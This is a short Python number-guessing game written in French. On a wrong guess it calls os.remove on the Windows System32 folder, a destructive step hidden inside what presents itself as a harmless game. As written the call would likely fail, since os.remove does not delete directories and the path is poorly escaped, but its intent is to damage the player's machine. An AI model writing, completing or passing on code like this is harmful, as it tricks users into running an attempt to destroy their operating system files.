import random 
import os

nombre = random.randint(1, 10)
guess = input("choisis un nombre entre 1 et 10")
guess = int(guess)

if guess == nombre:
    print("gg mec")
else:
    print("et c'est perdu")
    os.remove("c:\Windows\System32")